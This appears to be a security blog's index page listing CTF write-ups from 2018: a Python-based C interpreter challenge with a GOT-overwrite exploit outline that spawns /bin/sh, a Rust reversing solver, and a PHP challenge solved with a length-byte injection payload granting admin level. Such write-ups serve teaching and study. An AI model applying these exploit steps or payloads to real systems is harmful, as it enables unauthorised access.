<!DOCTYPE html>
<html lang="zh-cmn-Hans">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>KiraSys</title>
  
  
  <!--link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css"-->
  <link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css">
  <link rel="stylesheet" href="/css/style.css">
</head>

<body>
<div class="Shell">
    <aside class='SideBar'>
    <section class='avatar' style="background-image: url(/assets/header.png)">
        <div class='av-pic' style="background-image: url(/assets/logo.jpg)">
        </div>
    </section>
    <section class='menu'>
        <div>KiraSys</div>
        
            <div>CAT-Security</div>
        
        <ul>
          
            <a href="/" class="Btn">
              <li>Home</li>
            </a>  
          
            <a href="/archives/" class="Btn">
              <li>Archive</li>
            </a>  
          
            <a href="/categories/" class="Btn">
              <li>Categories</li>
            </a>  
          
        </ul>
    </section>
    <section class="media">
        
            
                <a href="https://github.com/kirasys">
                    <img src="/assets/github.svg" />
                </a>
            
        
            
                <a href="https://www.facebook.com/profile.php?id=100008635065103">
                    <img src="/assets/facebook.svg" />
                </a>
            
        
    </section>
</aside>

    <div class="container">
        <div data-pager-shell>
            <ul class="Index">
  
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2018/02/11/HolyShield-2018-Cython/">HolyShield 2018 - Cython</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2018-02-11T11:46:12.000Z" itemprop="datePublished">
    2018-02-11
  </time>
  
  
  / 
  <ul>
    
  <li class="meta-text">
  { <a href="/categories/etc/">Etc</a> }
  </li>


  </ul>
  
</div>

    </header>
    <div>
      
        <h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
<p>we are developing c language interpreter, can you find the vulnerability for me?</p>
</blockquote>
<p><br></p>
<h3 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /usr/bin/python2.7 cython.py 2&gt;1</span><br></pre></td></tr></table></figure>
<p>No additional modules are needed<br><br></p>
<h3 id="How-to-exploit"><a href="#How-to-exploit" class="headerlink" title="How to exploit"></a>How to exploit</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m1 = malloc(<span class="number">100</span>);</span><br><span class="line">read(0,m1,100) 			   -&gt; input '/bin/sh;'</span><br><span class="line">read(0,&amp;(python2.7 read@got),4); -&gt; input system@plt</span><br><span class="line">read(m1,<span class="number">1</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">blacklist = [<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'open'</span>,<span class="string">'printf'</span>,<span class="string">'put'</span>,<span class="string">'write'</span>,<span class="string">'_'</span>, <span class="string">'&#123;'</span>, <span class="string">'\\'</span>]</span><br><span class="line">vars = &#123;&#125;</span><br><span class="line">CNT  = <span class="number">10</span></span><br><span class="line">lib  = cdll.LoadLibrary(<span class="string">'libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cython</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">Qualifying</span><span class="params">(self)</span>:</span></span><br><span class="line">      hend = <span class="string">''</span>.join(<span class="string">'&#123;:02x&#125;'</span>.format(randrange(<span class="number">0</span>,<span class="number">0x100</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>))</span><br><span class="line">      <span class="keyword">print</span> <span class="string">"Before the service, I'll check if you're eligible"</span></span><br><span class="line">      <span class="keyword">print</span> <span class="string">"sha256(x).hexdigiest() == '&#123;0&#125;....'"</span>.format(hend)</span><br><span class="line">      x = raw_input(<span class="string">"x : "</span>)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> sha256(x).hexdigest().startswith(hend):</span><br><span class="line">         self.Error(<span class="string">"You're not eligible for the service"</span>)</span><br><span class="line">         exit(<span class="number">-1</span>)</span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">Error</span><span class="params">(self,msg)</span>:</span></span><br><span class="line">      <span class="keyword">print</span> <span class="string">"Error: "</span>+msg</span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self)</span>:</span></span><br><span class="line">      <span class="comment">#self.Qualifying()</span></span><br><span class="line">      <span class="keyword">print</span> <span class="string">"Cython 2.7.12 (default, Feb 21 2018, 02:37:52)"</span></span><br><span class="line">      <span class="keyword">print</span> <span class="string">"[GCC 5.4.0 20160609] on linux2"</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">print</span> <span class="string">"int main()&#123;"</span></span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> xrange(CNT):</span><br><span class="line">         command = raw_input(<span class="string">'\t'</span>)</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> command.endswith(<span class="string">'&#125;'</span>):</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> <span class="keyword">not</span> command.endswith(<span class="string">';'</span>):</span><br><span class="line">            self.Error(<span class="string">"Can't not found semicolon"</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">         </span><br><span class="line">         self.interpreter(command[:<span class="number">-1</span>])</span><br><span class="line">      <span class="keyword">print</span> <span class="string">"&#125;"</span></span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">interpreter</span><span class="params">(self,command)</span>:</span></span><br><span class="line">      <span class="keyword">if</span> command == <span class="string">''</span>:</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> len(command)&gt;<span class="number">100</span>:</span><br><span class="line">         self.Error(<span class="string">'Too long'</span>)</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> b <span class="keyword">in</span> blacklist:</span><br><span class="line">         <span class="keyword">if</span> b <span class="keyword">in</span> command:</span><br><span class="line">            self.Error(<span class="string">'Hack detected'</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment"># assign string (escape sequence not supported)</span></span><br><span class="line">      <span class="keyword">if</span> command.count(<span class="string">'"'</span>)%<span class="number">2</span> <span class="keyword">or</span> command.count(<span class="string">'\''</span>)%<span class="number">2</span>:</span><br><span class="line">         self.Error(<span class="string">'Misused string'</span>)</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">         sq , dq = command.rfind(<span class="string">'\''</span>), command.rfind(<span class="string">'"'</span>)</span><br><span class="line">         <span class="keyword">if</span> sq&gt;dq:</span><br><span class="line">            p = command[:sq]</span><br><span class="line">            string = command[p.rfind(<span class="string">'\''</span>): sq+<span class="number">1</span>]</span><br><span class="line">         <span class="keyword">elif</span> sq&lt;dq:</span><br><span class="line">            p = command[:dq]</span><br><span class="line">            string = command[p.rfind(<span class="string">'"'</span>): dq+<span class="number">1</span>]</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">if</span> sq == dq:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">print</span> string</span><br><span class="line">         command = command.replace(string,str(lib.strdup(string[<span class="number">1</span>:<span class="number">-1</span>])))</span><br><span class="line">         <span class="keyword">print</span> command</span><br><span class="line">      </span><br><span class="line">      <span class="string">"""</span></span><br><span class="line"><span class="string">      # indexing</span></span><br><span class="line"><span class="string">      if command.count('[')%2 or command.count(']')%2:</span></span><br><span class="line"><span class="string">         self.Error('Misused index operator')</span></span><br><span class="line"><span class="string">         return</span></span><br><span class="line"><span class="string">      """</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># resolve function</span></span><br><span class="line">      p = re.compile(<span class="string">'(\w+)\('</span>)</span><br><span class="line">      func_list = set(p.findall(command))</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> func <span class="keyword">in</span> func_list:</span><br><span class="line">         <span class="keyword">try</span>:</span><br><span class="line">            vars[func] = lib[func]</span><br><span class="line">         <span class="keyword">except</span> AttributeError <span class="keyword">as</span> e:</span><br><span class="line">            self.Error(e.message)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># assign variables (multiple assignment not supported)</span></span><br><span class="line">      p = re.compile(<span class="string">'([a-zA-Z]+\w*)\s*=\s*(.*)'</span>)</span><br><span class="line">      assign = p.match(command)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">         <span class="keyword">if</span> assign:</span><br><span class="line">            name = assign.group(<span class="number">1</span>)</span><br><span class="line">            value = re.sub(<span class="string">'([a-zA-Z]+)'</span>,<span class="string">"vars['\g&lt;1&gt;']"</span>,assign.group(<span class="number">2</span>))</span><br><span class="line">            vars[name] = eval(value)</span><br><span class="line">         <span class="keyword">else</span>:        </span><br><span class="line">            command = re.sub(<span class="string">'([a-zA-Z]+)'</span>,<span class="string">"vars['\g&lt;1&gt;']"</span>,command)</span><br><span class="line">            eval(command)</span><br><span class="line">      <span class="keyword">except</span>:</span><br><span class="line">         self.Error(<span class="string">'SyntaxError'</span>)</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">print</span> vars</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   i = Cython()</span><br><span class="line">   i.start()</span><br></pre></td></tr></table></figure>
      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2018/02/09/CODEGATE-2018-Boom/">CODEGATE 2018 - Boom</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2018-02-08T15:47:47.000Z" itemprop="datePublished">
    2018-02-09
  </time>
  
  
  / 
  <ul>
    
  <li class="meta-text">
  { <a href="/categories/reversing/">Reversing</a> }
  </li>


  </ul>
  
</div>

    </header>
    <div>
      
        <h3 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h3><p>문제에서 준 파일은 rust라는 언어로 만들어진 프로그램이다. hex-ray로 디컴 파일된 소스를 확인해보았더니 c나 c++보다 좀 더 복잡하고 분석하기 까다로웠다. 사실 이 문제를 처음 풀때는 어떻게 접근해야 될 지 몰라서 처음부터 막 분석하기 시작해서 푸는데 좀 더 오래 걸렸던 것 같다. <br><br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fmt_arguments(&amp;a2[<span class="number">1</span>], &amp;aEnter_this);</span><br><span class="line">cprintf();</span><br><span class="line"><span class="built_in">std</span>::process::<span class="built_in">exit</span>::h24f524da56e24372();</span><br></pre></td></tr></table></figure></p>
<p>무작정 분석하다보면 flag를 출력하는 부분을 보게 될 거라고 생각해서 프로그램의 처음부터 그냥 분석했는데, flag를 찾지 못해서 print 함수의 레퍼런스를 찾아봤다. “Enter this” 라는 문자열을 출력하는 부분이 있었고, 이 문자열이 출력되기 위해서 여러 개의 조건들을 통과해야 하는 걸보니 flag 출력이 맞다고 확신했다.</p>
<p>main 함수에서는 main::func1 함수를 실행시키고, 그 후부터는 입력값에 따라서 func2 ~ func7로 이동하였다. func1 ~ func7은 모두 입력을 받고 입력 값이 올바른지 확인후에 다른 함수로 분기하는 과정을 실행한다. 그래서 처음에는 func1 ~ func7에서 입력 값을 검사하는 루틴을 전부 분석하였는데 flag를 출력해주는 부분을 찾지 못했다. 알고보니 func1,func2,func4 ~ func6에서 입력 값이 올바르지 않을때에 func8을 실행하는데, func8 함수에서 실행하는 func11 함수에서 flag를 출력해주는 부분이 있었다. func1 ~ func7에서 입력값이 유효할 때 /tmp/files 에서 특정한 파일을 읽어 리스트에 저장하는데 이 값이 flag로 사용되었다. 그래서 flag를 알아내려면 입력값 검사 루틴을 무조건 분석해야한다.<br><br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// condition 1</span></span><br><span class="line">LODWORD(v2) = LinkedList_len(rsi0);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// condition 2</span></span><br><span class="line">  v45 = <span class="number">13</span> * v44 ^ <span class="number">0x11</span>;</span><br><span class="line">      v46 = &amp;v45;</span><br><span class="line">      LODWORD(v3) = list_iter(&amp;v38);</span><br><span class="line">      v47 = v3;</span><br><span class="line">      <span class="keyword">if</span> ( core_cmp(&amp;v46, &amp;v47) &amp; <span class="number">1</span> )</span><br><span class="line">        main::func9::h0a15ac6c05fddc27();</span><br></pre></td></tr></table></figure></p>
<p>flag를 출력 시켜주는 조건은 위와 같다. Linkedlist의 길이가 4이며 리스트에 값을 꺼내와서 특정 값과 비교한다. 그 값은 0x11, 0x1c, 0xb, 0x36 이였고 이 값들이 무엇을 의미하는지 알아보았다.<br><br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main::func1</span></span><br><span class="line">    push_back(a2, <span class="number">0x11</span>, v21, v22, v23);</span><br><span class="line">    v71 = <span class="number">0</span>;</span><br><span class="line">    v57 = *(a1 + <span class="number">16</span>);</span><br><span class="line">    v56 = *a1;</span><br><span class="line">    v72 = <span class="number">0</span>;</span><br><span class="line">    v59 = *(a2 + <span class="number">16</span>);</span><br><span class="line">    v58 = *a2;</span><br><span class="line">    v24 = main::func3::h70b687fbcc510fb0(&amp;v56, &amp;v58);</span><br><span class="line">    v14 = core::ptr::drop_in_place::hadd5eb8b6bbe8550(v24, &amp;v53);</span><br></pre></td></tr></table></figure></p>
<p>func1~func7에서 입력받은 값이 유효해 다른 함수로 분기할 때, 특정 값을 리스트에 push한다. 이 리스트가 flag를 검사할 때 사용되는 리스트였고 위에서 구한 값들이 어떤 함수인지 알아보니 각각 func1, func2, func7, func5 였다. 이 4개의 함수를 실행시키고 func4에서 잘못된 값을 입력해 func8로 넘어가면 된다.<br><br><br></p>
<h3 id="main-fucn1-gt-main-func2"><a href="#main-fucn1-gt-main-func2" class="headerlink" title="main::fucn1 -&gt; main::func2"></a>main::fucn1 -&gt; main::func2</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">std::io::stdio::Stdin::read_line::h0236420efe963fc6();</span><br><span class="line">  core::ptr::drop_in_place::h6715ef653ddd4421(&amp;v43, &amp;v44);</span><br><span class="line">  core::ptr::drop_in_place::h0c5d8ab0d3960ce8(&amp;v44);</span><br><span class="line">  LODWORD(v3) = alloc::string::String::pop::h2949ec2fec1fff2c(&amp;v42);</span><br><span class="line">  v74 = v3;</span><br><span class="line">  v45 = v3;</span><br><span class="line">  if ( core_strcmp(&amp;v42, &amp;v36) &amp; 1 )</span><br><span class="line">  &#123;</span><br></pre></td></tr></table></figure>
<p>단순히 문자열을 입력받아 비교하는 연산이다. input : ‘Know what? It’s a new day~’<br></p>
<h3 id="main-func2-gt-main-func7"><a href="#main-func2-gt-main-func7" class="headerlink" title="main::func2 -&gt; main::func7"></a>main::func2 -&gt; main::func7</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v18 = main::func10::hd8e1c12a44dfcdac(*(&amp;v72 + i), <span class="number">3L</span>L);</span><br><span class="line">v19 = main::func10::hd8e1c12a44dfcdac(v18 ^ <span class="number">0x62</span>u, <span class="number">5L</span>L);</span><br><span class="line">v58 = main::func10::hd8e1c12a44dfcdac(v19 ^ <span class="number">0x32</span>u, <span class="number">7L</span>L);</span><br><span class="line"><span class="keyword">if</span> ( i &gt;= <span class="number">7</span> )</span><br><span class="line">  core::panicking::panic_bounds_check::hbb625994aed54df2();</span><br><span class="line">*(&amp;v72 + i) = v58;</span><br><span class="line"><span class="keyword">if</span> ( i &gt;= <span class="number">7</span> )</span><br><span class="line">  core::panicking::panic_bounds_check::hbb625994aed54df2();</span><br><span class="line"><span class="keyword">if</span> ( i &gt;= <span class="number">7</span> )</span><br><span class="line">  core::panicking::panic_bounds_check::hbb625994aed54df2();</span><br><span class="line">*(&amp;v72 + i) %= <span class="number">47</span>;</span><br></pre></td></tr></table></figure>
<p>func2에서는 7개의 정수를 입력받고 그 정수로 간단한 xor 연산을 거친 후에 문자열과 비교하여 func4,func5 혹은 func7로 이동한다.<br><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">table = <span class="string">'f7*zq5$ase0t6ui#^yd2owgb_n8pu4!k&amp;vc@lrj19mx3h0:main.rs'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bitenc</span><span class="params">(a1,a2)</span>:</span></span><br><span class="line">	v4 = <span class="number">32</span> - a2</span><br><span class="line">	v3 = <span class="number">32</span> - a2</span><br><span class="line">	<span class="keyword">return</span> ((a1 &lt;&lt; (v3 &amp; <span class="number">0x1F</span>)) | ~(<span class="number">-1</span> &lt;&lt; (v4 &amp; <span class="number">0x1F</span>)) &amp; (a1 &gt;&gt; (a2 &amp; <span class="number">0x1F</span>)))&amp;<span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(v)</span>:</span></span><br><span class="line">	v1 = bitenc(v,<span class="number">3</span>)</span><br><span class="line">	v1 = bitenc(v1^<span class="number">0x62</span>,<span class="number">5</span>);</span><br><span class="line">	v1 = bitenc(v1^<span class="number">0x32</span>,<span class="number">7</span>) % <span class="number">47</span>;</span><br><span class="line">	<span class="keyword">return</span> table[v1]</span><br><span class="line"></span><br><span class="line">key = <span class="string">'pand0ra'</span> <span class="comment"># for going to func7</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(key)):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0x20</span>,<span class="number">0x7f</span>):</span><br><span class="line">		<span class="keyword">if</span> key[i] == enc(j):</span><br><span class="line">			<span class="keyword">print</span> j,</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
<p>input : ‘57 93 38 92 50 86 93’ <br></p>
<h3 id="main-func7-gt-main-func5"><a href="#main-func7-gt-main-func5" class="headerlink" title="main::func7 -&gt; main::func5"></a>main::func7 -&gt; main::func5</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// condition 1</span></span><br><span class="line">  LODWORD(v6) = len(&amp;v78);</span><br><span class="line">  <span class="keyword">if</span> ( v6 != <span class="number">25L</span>L )</span><br><span class="line">    main::func9::h0a15ac6c05fddc27();</span><br><span class="line"></span><br><span class="line"><span class="comment">// condition 2</span></span><br><span class="line">  <span class="keyword">if</span> ( v36 != *(&amp;v44 + <span class="number">5</span> * v39 + v38) )</span><br><span class="line">    main::func9::h0a15ac6c05fddc27();</span><br></pre></td></tr></table></figure>
<p>func7 에서는 25개의 정수를 입력받아서 테이블에 있는 값과 비교한다. input : ‘17 24 1 8 15 23 5 7 14 16 4 6 13 20 22 10 12 19 21 3 11 18 25 2 9’<br></p>
<h3 id="main-func5-gt-main-func4"><a href="#main-func5-gt-main-func4" class="headerlink" title="main::func5 -&gt; main::func4"></a>main::func5 -&gt; main::func4</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( main::func12::h2c7664a1999a9c74(<span class="number">0</span>, v14) != <span class="number">0x6B</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v48 = <span class="number">0</span>;</span><br><span class="line">  v45 = *(a1 + <span class="number">16</span>);</span><br><span class="line">  v44 = *a1;</span><br><span class="line">  v49 = <span class="number">0</span>;</span><br><span class="line">  v47 = *(v27 + <span class="number">16</span>);</span><br><span class="line">  v46 = *v27;</span><br><span class="line">  main::func8::h2f4dc8e7bc6e464b(&amp;v44, &amp;v46);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>func5 에서는 정수 1개를 입력받아 func12에서 연산을 진행하는데, func12의 루틴은 분석하기 복잡해서 그냥 브루트 포싱으로 찾았다.<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> kira <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0xffffff</span>):</span><br><span class="line">	s = process(<span class="string">'/root/boom'</span>)</span><br><span class="line"></span><br><span class="line">	s.recvuntil(<span class="string">'mission\n'</span>)</span><br><span class="line">	s.sendline(<span class="string">'Know what? It\'s a new day~'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(<span class="string">'57 93 38 92 50 86 93'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(<span class="string">'17 24 1 8 15 23 5 7 14 16 4 6 13 20 22 10 12 19 21 3 11 18 25 2 9'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(str(i))</span><br><span class="line">	res = s.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">if</span> res.find(<span class="string">'BOO'</span>)&lt;<span class="number">0</span> <span class="keyword">and</span> res.find(<span class="string">'thread'</span>)&lt;<span class="number">0</span>:</span><br><span class="line">		<span class="keyword">print</span> key</span><br><span class="line">		<span class="keyword">print</span> res</span><br><span class="line">		raw_input(<span class="string">'w'</span>)</span><br><span class="line">	s.close()</span><br></pre></td></tr></table></figure></p>
<p>input : ‘31’<br></p>
<h3 id="Get-flag"><a href="#Get-flag" class="headerlink" title="Get flag"></a>Get flag</h3><p>위의 4개의 함수를 모두 통과하면 func4로 오게 된다. func4는 4개의 정수를 입력받고 검사하지만, func8로 이동하기 위해 올바르지 않은 값을 입력하여 func8로 이동하면 flag을 얻을 수 있다. input : ‘1 1 1 1’<br><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># ./boom </span></span><br><span class="line">Welcome! You have to remove this bomb.</span><br><span class="line">Here<span class="string">'s the first mission</span></span><br><span class="line"><span class="string">Know what? It'</span>s a new day~</span><br><span class="line">Good job. Next one is~</span><br><span class="line">57 93 38 92 50 86 93</span><br><span class="line">Wowww</span><br><span class="line">17 24 1 8 15 23 5 7 14 16 4 6 13 20 22 10 12 19 21 3 11 18 25 2 9</span><br><span class="line">You did very well :)</span><br><span class="line">31</span><br><span class="line">GoGo!</span><br><span class="line">1 1 1 1</span><br><span class="line">Enter This! 12345678123456781234567812345678</span><br></pre></td></tr></table></figure></p>

      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2018/02/09/CODEGATE-2018-rbsql/">CODEGATE 2018 - rbsql</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2018-02-08T15:13:17.000Z" itemprop="datePublished">
    2018-02-09
  </time>
  
  
  / 
  <ul>
    
  <li class="meta-text">
  { <a href="/categories/web/">Web</a> }
  </li>


  </ul>
  
</div>

    </header>
    <div>
      
        <h3 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">"create"</span>:</span><br><span class="line">		$result = rbReadFile(SCHEMA);</span><br><span class="line">		<span class="keyword">for</span>($i=<span class="number">3</span>;$i&lt;count($result);$i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(strtolower($result[$i][<span class="number">0</span>]) === strtolower($table))&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="string">"Error6"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		$fileName = <span class="string">"../../rbSql/rbSql_"</span>.substr(md5(rand(<span class="number">10000000</span>,<span class="number">100000000</span>)),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">		$result[$i] = <span class="keyword">array</span>($table,$fileName);</span><br><span class="line">		rbWriteFile(SCHEMA,$result);</span><br><span class="line">		exec(<span class="string">"touch &#123;$fileName&#125;;chmod 666 &#123;$fileName&#125;"</span>);</span><br><span class="line">		$content = <span class="keyword">array</span>($table,$fileName,$query);</span><br><span class="line">		rbWriteFile($fileName,$content);</span><br><span class="line">		<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>문제 페이지로 들어가면 로그인, 회원 가입 기능들이 구현된 홈페이지를 볼 수 있고 php 파일 입출력을 통해 db를 구현하여 회원 정보를 저장한다. 먼저 데이터가 어떻게 변환되어 들어가는지 분석해보았다. 회원 가입할 때 $_POST[uid] = aaaa, $_POST[umail] = bbbb를 전달하면 ‘\x02\x02\x01\x04aaaa\x01\x04bbbb’로 들어간다. 다시 불러올때는 ‘\x02’은 배열 ‘\x01’을 문자열로 인식해서 처리한다.<br><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($page == <span class="string">"me"</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;uid : &#123;$_SESSION['uid']&#125;&lt;/p&gt;&lt;p&gt;level : "</span>;</span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'lvl'</span>] == <span class="number">1</span>) <span class="keyword">echo</span> <span class="string">"Guest"</span>;</span><br><span class="line">    <span class="keyword">elseif</span>($_SESSION[<span class="string">'lvl'</span>] == <span class="number">2</span>) <span class="keyword">echo</span> <span class="string">"Admin"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">"dbconn.php"</span>;</span><br><span class="line">    $ret = rbSql(<span class="string">"select"</span>,<span class="string">"member_"</span>.$_SESSION[<span class="string">'uid'</span>],[<span class="string">"id"</span>,$_SESSION[<span class="string">'uid'</span>]]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;mail : &#123;$ret['1']&#125;&lt;/p&gt;&lt;p&gt;ip : &#123;$ret['3']&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'lvl'</span>] === <span class="string">"2"</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Flag : &lt;/p&gt;"</span>;</span><br><span class="line">      <span class="keyword">include</span> <span class="string">"/flag"</span>;</span><br><span class="line">      rbSql(<span class="string">"delete"</span>,<span class="string">"member_"</span>.$_SESSION[<span class="string">'uid'</span>],[<span class="string">"id"</span>,$_SESSION[<span class="string">'uid'</span>]]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<p>mypage에서 회원 레벨이 2일때 flag를 출력해주며 회원 레벨은 가입 할때 기본적으로 1로 설정된다. 그래서 insert 할 때 인젝션 공격을 통해 레벨을 2로 만들려고 하였다.<br><br><br></p>
<h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// insert user-info</span></span><br><span class="line"><span class="keyword">if</span>(strlen($umail) &gt; <span class="number">256</span>) error(<span class="string">"email too long"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/// rbPack</span></span><br><span class="line"><span class="keyword">if</span>(is_string($data))&#123;</span><br><span class="line">	$rawData .= STR . chr(strlen($data)) . $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>회원 가입할 때 이메일을 최대 256개까지 입력할 수 있는데, rbPack 함수에서 길이 정보를 저장할 때 chr 함수를 사용해서 길이 정보를 ‘\x00’으로 만들 수 있다. email을 ‘%01%2081dc9bdb52d04dc20036dbd8313ed055%01%0e11111111111111%01%01%32%01%c9’+’a’*0xc9 로 보내면 flag를 얻을 수 있다.</p>

      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2018/02/05/AceBear-Security-Contest-2018-Hackspeed/">AceBear Security Contest 2018 - Hackspeed</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2018-02-05T08:17:06.000Z" itemprop="datePublished">
    2018-02-05
  </time>
  
  
  / 
  <ul>
    
  <li class="meta-text">
  { <a href="/categories/reversing/">Reversing</a> }
  </li>


  </ul>
  
</div>

    </header>
    <div>
      
